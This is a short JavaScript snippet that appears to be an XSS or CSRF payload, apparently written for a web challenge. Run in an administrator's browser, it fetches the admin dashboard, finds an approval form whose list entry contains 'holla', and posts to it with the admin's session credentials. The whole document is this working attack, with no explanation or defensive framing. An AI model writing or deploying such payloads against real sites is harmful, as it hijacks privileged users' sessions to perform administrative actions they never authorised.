(async () => {
  try {
    const res = await fetch('/admin/dashboard');
    const html = await res.text();
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const forms = doc.querySelectorAll('form[action^="/admin/approve/"]');
    for (let form of forms) {
      const li = form.closest('li');
      if (li && li.textContent.includes('holla')) {
        const action = form.getAttribute('action');
        await fetch(action, {method: 'POST', credentials: 'include'});
        break;
      }
    }
  } catch (e) {
    console.error(e);
  }
})();
